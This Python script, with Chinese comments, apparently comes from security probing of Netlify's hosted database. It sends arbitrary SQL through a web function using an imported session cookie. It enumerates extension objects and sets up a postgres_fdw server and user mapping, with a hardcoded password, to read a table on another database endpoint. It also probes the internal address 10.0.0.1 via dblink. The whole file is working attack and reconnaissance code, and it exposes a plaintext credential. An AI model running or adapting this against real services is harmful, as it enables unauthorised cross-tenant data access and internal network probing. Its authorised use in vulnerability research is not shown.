# -*- coding: utf-8 -*-
"""1. lakebase_text 扩展全部对象(按依赖查)
2. 出站重测:FDW 连新 B endpoint(ep-lucky-sound-aeh4epbm)
3. 出站 10.0.0.1 重测"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()


def q(sql, timeout=60, trunc=2500):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    body = {'siteId': SITE_A, 'action': 'query', 'sql': sql}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:trunc].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def show(label, sql, trunc=2500):
    st, out = q(sql, trunc=trunc)
    print('%-30s [%d] %s' % (label, st, out[:trunc]))
    return st


print('== lakebase_text 对象 ==')
show('lakebase_text 函数', "select n.nspname||'.'||p.proname||'('||pg_get_function_identity_arguments(p.oid)||')', "
     "p.prosecdef from pg_proc p join pg_depend d on d.objid=p.oid and d.classid='pg_proc'::regclass "
     "join pg_extension e on d.refobjid=e.oid where e.extname='lakebase_text' order by 1")
show('lakebase_text 表', "select c.relname, c.relkind from pg_class c join pg_depend d on d.objid=c.oid "
     "and d.classid='pg_class'::regclass join pg_extension e on d.refobjid=e.oid where e.extname='lakebase_text'")
show('lakebase_text 类型', "select t.typname from pg_type t join pg_depend d on d.objid=t.oid "
     "and d.classid='pg_type'::regclass join pg_extension e on d.refobjid=e.oid where e.extname='lakebase_text'")

print()
print('== 出站重测(新 B endpoint) ==')
steps = [
    ("create srv newB", "create server if not exists srv_nb foreign data wrapper postgres_fdw options (host 'ep-lucky-sound-aeh4epbm.c-2.us-east-2.db.netlify.com', port '5432', dbname 'netlifydb')"),
    ("um", "create user mapping if not exists for netlifydb_owner server srv_nb options (user 'netlifydb_owner', password 'npg_TWUSd2Mavu7G')"),
    ("ft", "create foreign table if not exists ft_nb(id int) server srv_nb options (schema_name 'public', table_name 'k_probe')"),
    ("read", 'select * from ft_nb'),
    ("clean ft", 'drop foreign table if exists ft_nb'),
    ("clean um", 'drop user mapping if exists for netlifydb_owner server srv_nb'),
    ("clean srv", 'drop server if exists srv_nb'),
]
for desc, sql in steps:
    st = show(desc, sql, 300)
print()
print('== 10.0.0.1 超时判定 ==')
show('10.0.0.1 dblink', "select dblink_connect('cx', 'host=10.0.0.1 port=5432 dbname=x user=x password=x')", 300)
